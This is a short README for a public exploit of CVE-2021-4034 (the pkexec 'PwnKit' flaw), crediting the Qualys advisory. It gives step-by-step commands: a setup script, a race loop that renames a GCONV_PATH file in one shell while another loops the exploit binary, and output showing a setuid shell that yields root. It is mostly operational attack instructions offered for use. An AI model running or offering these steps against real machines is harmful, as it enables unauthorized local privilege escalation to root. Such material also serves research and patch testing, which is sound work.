# CVE-2021-4034

Exploit for the [pwnkit vulnerability](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
from the Qualys team.

This exploit assumes that `gcc` is present on the target machine.

```
$ id
uid=1001(ayrx) gid=1002(ayrx) groups=1002(ayrx),27(sudo)
$ ./setup.sh
```

Run the following command in one bash session:
```
while :; do mv "GCONV_PATH=./value" "GCONV_PATH=./value.bak"; mv "GCONV_PATH=./value.bak" "GCONV_PATH=./value"; done
```

Run the following command in another bash session:

```
while :; do ./exploit; done
```

You will eventually win the race and obtain a `shell` binary that gives you
root access:

```
$ ls -lah shell
-rwsrwxrwx 1 root ayrx 16K Jan 26 08:57 shell
$ ./shell
# id
uid=0(root) gid=1002(ayrx) groups=1002(ayrx),27(sudo)
```

A short write up on the technique can be found on my [blog](https://www.ayrx.me/pwnkit-no-logs/).
